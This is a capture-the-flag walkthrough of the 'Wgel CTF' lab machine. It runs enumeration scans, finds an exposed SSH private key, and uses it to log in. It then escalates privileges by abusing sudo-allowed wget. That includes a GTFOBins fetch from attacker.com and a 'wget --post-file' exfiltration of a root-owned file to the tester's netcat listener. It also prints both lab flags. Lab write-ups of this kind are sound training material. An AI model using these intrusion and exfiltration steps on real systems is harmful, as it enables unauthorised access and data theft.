# Wgel CTF

Laurent Chauvin | November 02, 2022

## Resources

[1] https://gtfobins.github.io/

## Progress

```
export IP=10.10.147.239
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-02 02:44 EDT
Nmap scan report for 10.10.147.239
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.66 seconds
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.147.239
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/02 02:44:30 Starting gobuster in directory enumeration mode
===============================================================
/sitemap              (Status: 301) [Size: 316] [--> http://10.10.147.239/sitemap/]
```

Nikto scan
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.147.239
+ Target Hostname:    10.10.147.239
+ Target Port:        80
+ Start Time:         2022-11-02 02:44:44 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2c6e, size: 595ca55640d0c, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
```

Website is presenting the default Apache webpage.
Nothing in 'robots.txt'.

The website seems to be in '/sitemap'.

Restarting Gobuster here
```
gobuster dir -u $IP/sitemap -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.147.239/sitemap
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/02 02:53:35 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 323] [--> http://10.10.147.239/sitemap/images/]
/css                  (Status: 301) [Size: 320] [--> http://10.10.147.239/sitemap/css/]
/js                   (Status: 301) [Size: 319] [--> http://10.10.147.239/sitemap/js/]
/fonts                (Status: 301) [Size: 322] [--> http://10.10.147.239/sitemap/fonts/]
```

When looking carefully into the source code, we can find this comment
```
<!-- Jessie don't forget to udate the webiste -->
```

Now let's try Gobuster with a wordlist that contains config files (such as .htaccess)
```
gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt | tee gobuster_dirb_common.log 

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.147.239
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/02 03:05:49 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 278]
/sitemap              (Status: 301) [Size: 316] [--> http://10.10.147.239/sitemap/]
Progress: 4585 / 4615 (99.35%)===============================================================
2022/11/02 03:06:40 Finished
===============================================================
```

None of these are accessible. Let's try again with '/sitemap'
```
gobuster dir -u $IP/sitemap -w /usr/share/wordlists/dirb/common.txt | tee gobuster_dirb_common.log
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.147.239/sitemap
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/02 03:08:22 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.ssh                 (Status: 301) [Size: 321] [--> http://10.10.147.239/sitemap/.ssh/]
/css                  (Status: 301) [Size: 320] [--> http://10.10.147.239/sitemap/css/]
/fonts                (Status: 301) [Size: 322] [--> http://10.10.147.239/sitemap/fonts/]
/images               (Status: 301) [Size: 323] [--> http://10.10.147.239/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301) [Size: 319] [--> http://10.10.147.239/sitemap/js/]
Progress: 4578 / 4615 (99.20%)===============================================================
2022/11/02 03:09:13 Finished
===============================================================

```

Interesting, a '.ssh' directory. Let's check this out.

We find a private key. Let's download it.
```
wget http://10.10.147.239/sitemap/.ssh/id_rsa
```

From the comment in the source code, we can guess that 'jessie' is the webmaster. Probably have an ssh access.

Private key seems not encrypted, so let's try to connect.

```
chmod 600 jessie_id_rsa
ssh -i jessie_id_rsa jessie@$IP

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ 
```

We have access !! Let's get the flag.

```
jessie@CorpOne:~$ ls Desktop/
jessie@CorpOne:~$ ls Documents/
user_flag.txt

jessie@CorpOne:~$ cat Documents/user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
```

Time to privesc.
```
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Let's GTFObins wget. From [1]
```
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Fetch a remote file via HTTP GET request.

URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo wget $URL -O $LFILE
```

Let's set
```
URL=http://10.18.23.136/set_suid.sh
LFILE=/home/jessie/set_suid.sh
sudo wget $URL -O $LFILE
```

After several try, didn't get there.

However, I found that wget have a '--post-file' option.

After starting a listening server
```
nc -lnvp 5554
```

I managed to exfiltrate the root flag
```
sudo wget --post-file=/root/root_flag.txt 10.18.23.136:5554
```

And received
```
listening on [any] 5554 ...
connect to [10.18.23.136] from (UNKNOWN) [10.10.147.239] 33438
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.18.23.136:5554
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```

I was initially trying to read the file '/root/root.txt' but file was 'missing'.
After a few trial and error, I found it under '/root/root_flag.txt'.

## Flag

1. User

```
057c67131c3d5e42dd5cd3075b198ff6
```

2. Privesc

```
b1b968b37519ad1daa6408188649263d
```
